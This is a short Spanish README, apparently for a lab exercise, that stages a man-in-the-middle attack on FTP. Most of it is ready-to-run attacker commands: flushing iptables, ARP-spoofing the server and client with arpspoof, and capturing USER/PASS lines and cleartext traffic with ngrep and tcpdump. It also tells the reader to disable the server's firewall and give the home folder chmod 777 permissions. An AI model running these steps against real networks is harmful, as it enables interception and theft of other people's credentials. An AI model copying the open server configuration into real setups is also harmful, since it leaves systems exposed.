Men in the MIttle

Conocer las IP's victimas, en mi caso Ubuntu (servidor ftp) y windows (emisor)

# Intruso (PC atacante)
```
sudo iptables -F
sudo iptables -P FORWARD ACCEPT
sudo arpspoof -i wlp3s0 -t {ip-servidor ftp} {ip-emisor-ftp}
sudo arpspoof -i wlp3s0 -t {ip-emisor-ftp} {ip-servidor}
# En la carpeta raiz del proyecto
sudo ngrep -W byline -d wlp3s0 "USER|PASS" port 21 > capturas_ftp.txt
sudo tcpdump -i wlp3s0 -A -nn -l 'port 21 or port 20' > contenido_trafico.txt
python3 server.py
```
# Servidor ftp
* **Desactivar Firewall**
* Instalar el servicio ftp y editar el archivo conf para permitir escritura.
* Dar permisor a tu careta home con chmod 777 para permitir escritura, lectura y eecucion.
* iniciar el servicio ftp
```
sudo systemctl start vsftpd
```
# Emisor
Conectarte a la ip del servidor ftp e iniciar sesion con sus credenciales.
